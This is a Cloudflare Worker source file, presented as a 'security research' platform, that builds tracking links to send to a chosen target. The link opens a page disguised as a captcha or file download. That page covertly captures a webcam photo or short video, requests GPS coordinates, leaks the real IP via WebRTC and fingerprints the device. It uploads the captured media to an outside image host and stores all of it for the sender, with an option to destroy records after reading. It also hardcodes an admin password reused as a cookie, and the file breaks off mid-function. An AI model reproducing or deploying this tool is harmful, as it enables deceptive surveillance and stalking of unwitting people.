/**
 * 现代简约技术研究系统 - 增强版 & 独立后台登录
 * 仅供安全研究、靶场测试及前端权限调用学习使用
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

// WebRTC STUN 服务器配置
const STUN_SERVERS = [
  { url: "stun:stun.chat.bilibili.com:3478", region: "China", provider: "Bilibili" },
  { url: "stun:stun.hitv.com:3478", region: "China", provider: "芒果 TV" },
  { url: "stun:stun.miwifi.com:3478", region: "China", provider: "小米Wifi" },
  { url: "stun:stun.l.google.com:19302", region: "Global", provider: "Google" },
  { url: "stun:stun.cloudflare.com:3478", region: "Global", provider: "Cloudflare" },
  { url: "stun:global.stun.twilio.com:3478", region: "Global", provider: "Twilio" },
  { url: "stun:stun.nextcloud.com:3478", region: "Global", provider: "NextCloud" },
  { url: "stun:stun.voip.blackberry.com:3478", region: "Global", provider: "BlackBerry" },
  { url: "stun:stun.freeswitch.org:3478", region: "Global", provider: "FreeSwitch" }
];

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 1. 自动初始化数据库
    await initDB(env);

    // 2. 路由分发
    if (path === "/" || path === "/index.html") return renderHome();
    if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);
    
    // API 接口
    if (path === "/api/generate") return handleGenerate(request, env);
    if (path === "/api/upload") return handleUpload(request, env);
    if (path === "/api/query") return handleQuery(request, env);
    if (path === "/api/webrtc") return handleWebRTC(request, env);
    
    // 管理后台 (独立登录页)
    if (path === "/admin") return renderAdmin(request, env);
    if (path === "/admin/delete") return handleAdminDelete(request, env);
    if (path === "/admin/clear") return handleAdminClear(request, env);

    return new Response("Not Found", { status: 404 });
  }
};

/**
 * ==========================================
 * 数据库与后端业务逻辑
 * ==========================================
 */

async function initDB(env) {
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS sys_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      target_id TEXT,
      event_type TEXT,    -- 'GENERATE', 'VISIT', 'QUERY'
      ip TEXT,
      real_ip TEXT,
      webrtc_leak TEXT,
      geo_info TEXT,      
      device_geo TEXT,    
      media_type TEXT,    
      media_url TEXT,
      ua TEXT,
      ua_parsed TEXT,
      device_info TEXT,
      status TEXT,
      is_burned INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
}

// 解析 User-Agent
function parseUA(ua) {
  if (!ua) return {};
  
  const result = {
    raw: ua,
    browser: "Unknown",
    os: "Unknown",
    device: "Desktop",
    engine: "Unknown"
  };

  // 检测浏览器
  if (ua.includes("Chrome") && !ua.includes("Chromium")) result.browser = "Chrome";
  else if (ua.includes("Safari") && !ua.includes("Chrome")) result.browser = "Safari";
  else if (ua.includes("Firefox")) result.browser = "Firefox";
  else if (ua.includes("Edge")) result.browser = "Edge";
  else if (ua.includes("Opera")) result.browser = "Opera";
  else if (ua.includes("MSIE") || ua.includes("Trident")) result.browser = "IE";

  // 检测操作系统
  if (ua.includes("Windows")) result.os = "Windows";
  else if (ua.includes("Mac")) result.os = "macOS";
  else if (ua.includes("Linux")) result.os = "Linux";
  else if (ua.includes("Android")) result.os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) result.os = "iOS";

  // 检测设备类型
  if (ua.includes("Mobile") || ua.includes("Android")) result.device = "Mobile";
  else if (ua.includes("Tablet") || ua.includes("iPad")) result.device = "Tablet";

  // 检测渲染引擎
  if (ua.includes("Webkit")) result.engine = "Webkit";
  else if (ua.includes("Gecko")) result.engine = "Gecko";
  else if (ua.includes("Trident")) result.engine = "Trident";

  return result;
}

// 收集设备信息
function collectDeviceInfo() {
  return {
    language: "navigator.language",
    timezone: "Intl.DateTimeFormat().resolvedOptions().timeZone",
    screen: { width: "window.screen.width", height: "window.screen.height" },
    cores: "navigator.hardwareConcurrency",
    memory: "navigator.deviceMemory"
  };
}

async function getGeoByIp(ip) {
  try {
    const res = await fetch(`${GEO_API}?ip=${ip}`);
    return await res.text();
  } catch (e) {
    return JSON.stringify({ error: "Geo API Timeout" });
  }
}

async function handleWebRTC(request, env) {
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  
  try {
    const data = await request.json();
    return new Response(JSON.stringify({ success: true, results: data.results }), { 
      headers: { "Content-Type": "application/json" } 
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e.message }), { status: 500 });
  }
}

async function handleGenerate(request, env) {
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  const data = await request.json();
  const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
  const geo = await getGeoByIp(ip);

  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?, ?, ?, ?, ?, ?)")
    .bind(data.id, 'GENERATE', ip, geo, request.headers.get('user-agent'), 'success')
    .run();

  const encoded = btoa(encodeURIComponent(JSON.stringify(data)));
  return new Response(JSON.stringify({ url: `${new URL(request.url).origin}/t/${encoded}` }), { headers: { "Content-Type": "application/json" } });
}

async function handleQuery(request, env) {
  const { searchParams } = new URL(request.url);
  const targetId = searchParams.get('id');
  const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
  const geo = await getGeoByIp(ip);

  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?, ?, ?, ?, ?, ?)")
    .bind(targetId, 'QUERY', ip, geo, request.headers.get('user-agent'), 'success')
    .run();

  const { results } = await env.DB.prepare("SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_burned = 0 ORDER BY created_at DESC").bind(targetId).all();

  if (results.length > 0) {
    const shouldBurn = searchParams.get('burn') === 'true';
    if (shouldBurn) {
      await env.DB.prepare("UPDATE sys_logs SET is_burned = 1 WHERE target_id = ? AND event_type = 'VISIT'").bind(targetId).run();
    }
  }

  return new Response(JSON.stringify(results), { headers: { "Content-Type": "application/json" } });
}

async function handleUpload(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get('file');
    const config = JSON.parse(formData.get('config'));
    const deviceGeo = formData.get('location');
    const status = formData.get('status');
    const mediaType = config.mode;
    const ua = request.headers.get('user-agent') || 'Unknown';
    const uaParsed = JSON.stringify(parseUA(ua));
    const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
    const geo = await getGeoByIp(ip);
    const webrtcData = formData.get('webrtc');
    const deviceInfo = formData.get('device_info');
    const realIp = formData.get('real_ip');

    let fullMediaUrl = "";

    if (file && status === 'success') {
      const uploadForm = new FormData();
      uploadForm.append('file', file);
      const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: 'POST', body: uploadForm });
      if (tcRes.ok) {
        const tcData = await tcRes.json();
        fullMediaUrl = `https://${IMAGE_HOST}${tcData[0].src}`;
      }
    }

    await env.DB.prepare(`
      INSERT INTO sys_logs (target_id, event_type, ip, real_ip, webrtc_leak, geo_info, device_geo, media_type, media_url, ua, ua_parsed, device_info, status) 
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(config.id, 'VISIT', ip, realIp || ip, webrtcData || null, geo, deviceGeo, mediaType, fullMediaUrl, ua, uaParsed, deviceInfo, status).run();

    return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

async function handleAdminDelete(request, env) {
  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return new Response("Unauthorized", { status: 401 });
  }

  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });

  const data = await request.json();
  const id = data.id;

  await env.DB.prepare("DELETE FROM sys_logs WHERE id = ?").bind(id).run();

  return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
}

async function handleAdminClear(request, env) {
  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return new Response("Unauthorized", { status: 401 });
  }

  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });

  await env.DB.prepare("DELETE FROM sys_logs").run();

  return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
}

/**
 * ==========================================
 * 前端 UI 渲染 (首页、目标页)
 * ==========================================
 */

function renderHome() {
  const html = `
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEC-TEST 漏洞分析平台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
      body { background: linear-gradient(135deg, #f6f8fd 0%, #f1f5f9 100%); }
      .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.5); }
      .fade-in { animation: fadeIn 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
      @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      input:checked + .toggle-bg { background-color: #4f46e5; }
      input:checked + .toggle-bg + .dot { transform: translateX(100%); }
      .custom-scrollbar::-webkit-scrollbar { width: 6px; }
      .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
    </style>
  </head>
  <body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
    
    <div class="max-w-4xl mx-auto p-6 pt-12">
      <div class="glass rounded-2xl p-6 mb-8 shadow-sm fade-in">
        <h1 class="text-2xl font-bold text-indigo-900 mb-4"><i class="fa-solid fa-shield-halved mr-2"></i>SEC-TEST 技术研究实验平台</h1>
        <div class="text-sm text-gray-600 space-y-2 leading-relaxed">
          <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，<strong>绝非非法用途</strong>，否则后果自负！网站权限均由用户浏览器原生机制自愿点击允许。</p>
          <p>2. 识别ID为查看结果的唯一凭证，请妥善保管。</p>
          <p>3. 如有侵权、肖像权等问题，请联系系统管理员进行物理删除。</p>
          <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：受iOS系统安全限制，苹果设备须使用Safari浏览器原生内核打开方可正常调用底层硬件接口。</p>
        </div>
      </div>

      <div class="grid md:grid-cols-2 gap-8">
        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.1s;">
          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-wand-magic-sparkles text-indigo-500 mr-2"></i>生成面板</h2>
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">跟踪 ID (如QQ号)</label>
              <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
            </div>
            
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">伪装模板</label>
                <select id="template" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
                  <option value="blank">空白加载模板</option>
                  <option value="captcha">人机验证模板</option>
                  <option value="download">文件下载模板</option>
                  <option value="redirect">链接跳转模板</option>
                </select>
              </div>
              <div id="redirect_url_box" class="hidden">
                <label class="block text-sm font-medium text-gray-700 mb-1">跳转目标地址</label>
                <input id="redirect_url" type="text" placeholder="http://" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
              </div>
            </div>

            <div class="flex items-center space-x-6 pt-2">
              <label class="flex items-center cursor-pointer">
                <input type="radio" name="mode" value="photo" checked class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
                <span class="ml-2 text-sm text-gray-700">极速拍照</span>
              </label>
              <label class="flex items-center cursor-pointer">
                <input type="radio" name="mode" value="video" class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
                <span class="ml-2 text-sm text-gray-700">3秒录像</span>
              </label>
            </div>

            <div class="space-y-3 pt-2">
              <label class="flex items-center cursor-pointer">
                <div class="relative">
                  <input type="checkbox" id="need_location" class="sr-only">
                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
                </div>
                <span class="ml-3 text-sm font-medium text-gray-700">同时请求精准经纬度 (GPS)</span>
              </label>
              <label class="flex items-center cursor-pointer">
                <div class="relative">
                  <input type="checkbox" id="burn_after_reading" class="sr-only">
                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
                </div>
                <span class="ml-3 text-sm font-medium text-gray-700">开启阅后即焚 (查询一次即销毁)</span>
              </label>
            </div>

            <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex justify-center items-center">
              <i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接
            </button>
            <div id="link_result" class="hidden p-4 bg-indigo-50 border border-indigo-100 rounded-xl text-indigo-800 text-sm break-all"></div>
          </div>
        </div>

        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.2s;">
          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-magnifying-glass text-emerald-500 mr-2"></i>查询面板</h2>
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">追踪 ID</label>
              <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
            </div>
            <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex justify-center items-center">
              <i class="fa-solid fa-database mr-2"></i> 检索返回结果
            </button>
            
            <div id="query_loading" class="hidden text-center py-8 text-gray-400"><i class="fa-solid fa-circle-notch fa-spin fa-2x"></i></div>
            <div id="query_result" class="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"></div>
          </div>
        </div>
      </div>
    </div>

    <script>
      document.getElementById('template').addEventListener('change', function() {
        document.getElementById('redirect_url_box').style.display = this.value === 'redirect' ? 'block' : 'none';
      });

      async function generateLink() {
        const id = document.getElementById('target_id').value.trim();
        if(!id) return alert('请输入追踪 ID');
        
        const config = {
          id: id,
          template: document.getElementById('template').value,
          redirectUrl: document.getElementById('redirect_url').value,
          mode: document.querySelector('input[name="mode"]:checked').value,
          needLocation: document.getElementById('need_location').checked,
          burn: document.getElementById('burn_after_reading').checked
        };

        const btn = event.currentTarget;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i>处理中...';
        
        try {
          const res = await fetch('/api/generate', {
            method: 'POST',
            body: JSON.stringify(config),
            headers: { 'Content-Type': 'application/json' }
          });
          const data = await res.json();
          const linkBox = document.getElementById('link_result');
          linkBox.innerHTML = '<div class="font-bold mb-1">复制以下链接发送给目标：</div><a href="' + data.url + '" target="_blank" class="underline">' + data.url + '</a>';
          linkBox.classList.remove('hidden');
        } catch(e) {
          alert('生成失败');
        } finally {
          btn.innerHTML = '<i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接';
        }
      }

      async function queryData() {
        const id = document.getElementById('query_id').value.trim();
        if(!id) return alert('请输入追踪 ID');
        
        const isBurn = document.getElementById('burn_after_reading').checked;
        document.getElementById('query_loading').classList.remove('hidden');
        document.getElementById('query_result').innerHTML = '';

        try {
          const res = await fetch('/api/query?id=' + encodeURIComponent(id) + '&burn=' + isBurn);
          const logs = await res.json();
          
          if(logs.length === 0) {
            document.getElementById('query_result').innerHTML = '<div class="text-center text-gray-500 py-6">暂无该ID的访问数据或已被销毁。</div>';
            return;
          }

          let html = '';
          logs.forEach((log, index) => {
            let mediaHtml = '';
            if (log.status === 'denied') {
              mediaHtml = '<div class="p-4 bg-red-50 text-red-600 rounded-xl text-center font-medium border border-red-100"><i class="fa-solid fa-ban mr-2"></i>用户拒绝了多媒体权限</div>';
            } else if (log.media_url) {
              if (log.media_type === 'video') {
                mediaHtml = '<video src="' + log.media_url + '" controls class="w-full rounded-xl shadow-sm"></video>';
              } else {
                mediaHtml = '<img src="' + log.media_url + '" class="w-full rounded-xl shadow-sm">';
              }
            }

            let geoHtml = '';
            if (log.device_geo) {
              const geo = JSON.parse(log.device_geo);
              if(geo.denied) {
                 geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
              } else {
                 geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + geo.lng + ', ' + geo.lat + ' (精度:' + geo.accuracy + 'm)</div>';
              }
            }

            let webrtcHtml = '';
            if (log.webrtc_leak) {
              try {
                const webrtc = JSON.parse(log.webrtc_leak);
                if (webrtc.results && webrtc.results.length > 0) {
                  const leaked = webrtc.results.filter(r => r.ip && r.ip !== '');
                  if (leaked.length > 0) {
                    webrtcHtml = '<div class="text-sm text-red-600 mt-2"><i class="fa-solid fa-triangle-exclamation mr-1"></i>WebRTC真实IP：<span class="font-mono font-bold">' + leaked[0].ip + '</span> (' + leaked[0].provider + ')</div>';
                  }
                }
              } catch(e) {}
            }

            let uaHtml = '';
            if (log.ua_parsed) {
              try {
                const uaParsed = JSON.parse(log.ua_parsed);
                uaHtml = '<div class="text-sm text-gray-600 mt-2"><i class="fa-solid fa-laptop mr-1"></i>' + uaParsed.browser + ' / ' + uaParsed.os + ' / ' + uaParsed.device + '</div>';
              } catch(e) {}
            }

            const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
            const flag = ipInfo.flag || '';
            const cReg = ipInfo.countryRegion || '';
            const city = ipInfo.city || '';
            const accessIp = log.real_ip && log.real_ip !== log.ip ? log.real_ip : log.ip;
            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + ipInfo.ip + ']' : log.ip;
            const dateStr = new Date(log.created_at).toLocaleString();

            html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
                      '<div class="flex justify-between items-center mb-3">' +
                        '<span class="text-xs font-bold px-2 py-1 bg-gray-100 rounded text-gray-600">记录 #' + log.id + '</span>' +
                        '<span class="text-xs text-gray-400"><i class="fa-regular fa-clock"></i> ' + dateStr + '</span>' +
                      '</div>' +
                      mediaHtml +
                      geoHtml +
                      webrtcHtml +
                      uaHtml +
                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
                        '<div><i class="fa-solid fa-network-wired w-4"></i> CF IP: ' + log.ip + '</div>' +
                        (log.real_ip && log.real_ip !== log.ip ? '<div><i class="fa-solid fa-globe w-4"></i> 真实IP: <span class="font-mono font-bold text-indigo-600">' + log.real_ip + '</span></div>' : '') +
                        '<div><i class="fa-solid fa-map-location-dot w-4"></i> ' + finalIpStr + '</div>' +
                        '<div class="truncate" title="' + log.ua + '"><i class="fa-brands fa-safari w-4"></i> ' + log.ua + '</div>' +
                      '</div>' +
                    '</div>';
          });
          document.getElementById('query_result').innerHTML = html;
        } finally {
          document.getElementById('query_loading').classList.add('hidden');
        }
      }
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

function renderTargetPage(encodedConfig) {
  const stunServers = JSON.stringify(STUN_SERVERS);
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统验证</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body { margin:0; font-family: system-ui, -apple-system, sans-serif; background: #f8fafc; }
      .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
  </head>
  <body class="flex items-center justify-center min-h-screen">
    <div id="template_container" class="w-full max-w-sm p-6 text-center"></div>
    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
      const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
      const stunServers = ${stunServers};
      let deviceLocation = null;
      let webrtcResults = [];

      function renderUI() {
        const container = document.getElementById('template_container');
        if (config.template === 'captcha') {
          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-4">请允许浏览器相关权限以完成活体检测</p><div class="flex justify-center"><div class="loader"></div></div></div>';
        } else if (config.template === 'download') {
          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg></div><h3 class="font-bold text-gray-800 mb-2">文件解析中...</h3><p class="text-sm text-gray-500">正在准备安全下载通道</p></div>';
        } else {
           container.innerHTML = '<div class="flex flex-col items-center"><div class="loader mb-4"></div><div class="text-gray-500 text-sm">页面加载中，请稍候...</div></div>';
        }
      }

      // WebRTC IP 检测
      async function detectWebRTCIP() {
        return new Promise(async (resolve) => {
          webrtcResults = [];
          let completed = 0;

          for (const stun of stunServers) {
            const pc = new RTCPeerConnection({
              iceServers: [{ urls: [stun.url] }]
            });

            pc.onicecandidate = (ice) => {
              if (!ice || !ice.candidate) return;
              const candidate = ice.candidate.candidate;
              const ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;
              const match = candidate.match(ipRegex);
              if (match && match[1]) {
                webrtcResults.push({
                  url: stun.url,
                  ip: match[1],
                  region: stun.region,
                  provider: stun.provider
                });
              }
            };

            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => {});

            setTimeout(() => {
              pc.close();
              completed++;
              if (completed === stunServers.length) {
                resolve();
              }
            }, 2000);
          }
        });
      }

      // 收集更多设备信息
      async function collectDeviceInfo() {
        const info = {
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth },
          cores: navigator.hardwareConcurrency || 'Unknown',
          memory: navigator.deviceMemory || 'Unknown',
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack
        };
        return JSON.stringify(info);
      }

      async function execute() {
        renderUI();

        // 收集 WebRTC IP
        await detectWebRTCIP();

        if (config.needLocation) {
          try {
            const pos = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
            });
            deviceLocation = JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
          } catch(e) {
            deviceLocation = JSON.stringify({ denied: true, error: e.message });
          }
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
          });
          
          if (config.mode === 'video') {
            await captureVideo(stream);
          } else {
            await capturePhoto(stream);
          }
        } catch(e) {
          await sendPayload(null, 'denied');
        }

        if (config.template === 'redirect' && config.redirectUrl) {
          window.location.href = config.redirectUrl.startsWith('http') ? config.redirectUrl : 'http://' + config.redirectUrl;
        } else {
          document.getElementById('template_container').innerHTML = '<div class="text-green-600 font-bold">✓ 验证通过</div>';
        }
      }

      async function capturePhoto(stream) {
        const v = document.getElementById('v');
        v.srcObject = stream;
        await new Promise(resolve => v.onloadedmetadata = resolve);
        await new Promise(r => setTimeout(r, 800));
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        const ctx = c.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, c.width, c.height);
        ctx.drawImage(v, 0, 0, c.width, c.height);
        stream.getTracks().forEach(t => t.stop());

        c.toBlob(async (blob) => {
          await sendPayload(blob, 'success');
        }, 'image/jpeg', 0.9);
      }

      async function captureVideo(stream) {
        const mediaConstraints = { video: true, audio: false };
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
          stream.getTracks().forEach(t => t.stop());
          const blob = new Blob(chunks, { type: 'video/webm' });
          await sendPayload(blob, 'success');
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 3000);
      }

      async function sendPayload(blob, status) {
        const fd = new FormData();
        if(blob) fd.append('file', blob, config.mode === 'video' ? 'v.webm' : 'p.jpg');
        fd.append('config', JSON.stringify(config));
        fd.append('status', status);
        if(deviceLocation) fd.append('location', deviceLocation);
        if(webrtcResults.length > 0) fd.append('webrtc', JSON.stringify({ results: webrtcResults }));
        
        // 尝试获取真实 IP (如果 WebRTC 泄露)
        if (webrtcResults.length > 0 && webrtcResults[0].ip) {
          fd.append('real_ip', webrtcResults[0].ip);
        }
        
        const deviceInfo = await collectDeviceInfo();
        fd.append('device_info', deviceInfo);
        
        await fetch('/api/upload', { method: 'POST', body: fd });
      }

      window.onload = () => setTimeout(execute, 100);
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

/**
 * ==========================================
 * 全局管理员总控中心后台 & 登录页
 * ==========================================
 */

function renderAdminLogin(errorMsg = "") {
  const errorHtml = errorMsg ? `<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">${errorMsg}</div>` : "";
  const html = `
  <!DOCTYPE html>
  <html lang="zh">
  <head>
    <meta charset="UTF-8">
    <title>SEC-TEST 后台登录</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  </head>
  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full">
      <div class="text-center mb-8">
        <div class="w-16 h-16 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
          <i class="fa-solid fa-server"></i>
        </div>
        <h1 class="text-2xl font-bold text-gray-800">系统控制台</h1>
        <p class="text-gray-500 text-sm mt-2">请输入管理员密码以继续</p>
      </div>
      ${errorHtml}
      <form method="POST" action="/admin" class="space-y-6">
        <div>
          <input type="password" name="password" required placeholder="请输入密码" class="w-full px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
        </div>
        <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95">
          进入后台
        </button>
      </form>
    </div>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

async function renderAdmin(request, env) {
  // 1. 处理登录请求 POST 
  if (request.method === "POST") {
    const formData = await request.formData();
    const pwd = formData.get("password");
    if (pwd === ADMIN_PASSWORD) {
      // 登录成功，下发 Cookie 并跳转回 /admin
      return new Response("Redirecting...", {
        status: 302,
        headers: {
          "Location": "/admin",
          "Set-Cookie": `admin_auth=${ADMIN_PASSWORD}; Path=/; HttpOnly; Max-Age=86400`
        }
      });
    } else {
      return renderAdminLogin("密码错误，请重试");
    }
  }

  // 2. 拦截未携带正确 Cookie 的访问 GET
  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return renderAdminLogin();
  }

  // 3. 渲染真实的后台面板
  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY id DESC LIMIT 500").all();

  // 为防止 esbuild 报错，后台列表渲染采用标准字符串拼接
  let timelineHtml = "";
  for (const r of results) {
    let eventColor = r.event_type === 'GENERATE' ? 'bg-blue-100 text-blue-700 border-blue-200' : (r.event_type === 'QUERY' ? 'bg-emerald-100 text-emerald-700 border-emerald-200' : 'bg-purple-100 text-purple-700 border-purple-200');
    let eventIcon = r.event_type === 'GENERATE' ? 'fa-wand-magic' : (r.event_type === 'QUERY' ? 'fa-search' : 'fa-crosshairs');
    let eventTitle = r.event_type === 'GENERATE' ? '生成链接' : (r.event_type === 'QUERY' ? '查询数据' : '访问记录');
    
    let ipInfo = {};
    try { if (r.geo_info) ipInfo = JSON.parse(r.geo_info); } catch(e){}
    
    let geoStr = '位置未知';
    if (ipInfo.ip) {
      geoStr = (ipInfo.flag || '🌍') + ' ' + (ipInfo.countryRegion || '') + ' ' + (ipInfo.city || '');
    }

    let mediaBlock = '<span class="text-gray-400 text-xs">无</span>';
    if (r.event_type === 'VISIT') {
      if (r.status === 'denied') {
